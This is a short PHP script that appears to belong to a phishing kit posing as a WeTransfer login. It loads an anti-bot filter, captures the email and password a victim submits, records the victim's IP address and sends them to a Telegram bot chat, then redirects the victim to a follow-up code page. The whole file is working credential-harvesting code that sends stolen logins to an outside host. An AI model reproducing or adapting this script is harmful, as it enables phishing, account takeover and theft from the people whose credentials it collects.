<?php

include "antibots.php";
include "token.php";


$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");

if(isset($_POST['sub'])){
	$message .= '
<<<<<<-------- ID WeTransfer  <<<<<<----------
_____________________________________
Identifiant  =  '.$_POST['mail'].'
Identifiant  =  '.$_POST['passw'].'
  ------------ infos ------------
------------ '.$ip.' ------------
-------------------By SANTOX  ------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=../code.php");
    exit();
}



?>